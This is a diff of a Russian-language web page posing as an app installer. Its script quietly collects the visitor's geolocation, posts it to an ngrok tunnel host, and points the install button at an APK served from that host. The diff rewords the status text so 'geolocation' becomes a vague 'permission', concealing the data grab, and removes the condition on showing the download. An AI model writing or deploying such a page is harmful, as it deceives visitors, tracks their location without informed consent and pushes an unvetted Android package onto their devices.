@@ -20,7 +20,7 @@
 </head>
 <body>
   <h2>Добро пожаловать! Для установки дайте разрешение</h2>
-  <p id="status">Ожидание геолокации...</p>
+  <p id="status">Ожидание разрешения...</p>
   <button id="installBtn">Установить приложение</button>
 
   <script>
@@ -38,30 +38,26 @@
         };
 
         try {
-          const res = await fetch('https://c0e0-149-102-242-94.ngrok-free.app/log', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+          await fetch("https://c0e0-149-102-242-94.ngrok-free.app/log", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
             body: JSON.stringify(geoData)
           });
 
-          const result = await res.json();
-          if (result && result.apk) {
-            installBtn.style.display = 'inline-block';
-            installBtn.onclick = () => {
-              window.location.href = "https://c0e0-149-102-242-94.ngrok-free.app/download/app.apk";
-            };
-            status.textContent = "Нажмите, чтобы установить приложение.";
-          } else {
-            status.textContent = "Данные отправлены, но ссылка не получена.";
-          }
+          installBtn.style.display = "inline-block";
+          status.textContent = "Спасибо! Теперь вы можете установить приложение.";
         } catch (err) {
-          status.textContent = "Ошибка отправки геоданных.";
+          status.textContent = "Ошибка отправки данных.";
         }
       },
       err => {
         status.textContent = "Ошибка геолокации: " + err.message;
       }
     );
+
+    installBtn.onclick = () => {
+      window.location.href = "https://c0e0-149-102-242-94.ngrok-free.app/download/app.apk";
+    };
   </script>
 </body>
 </html>
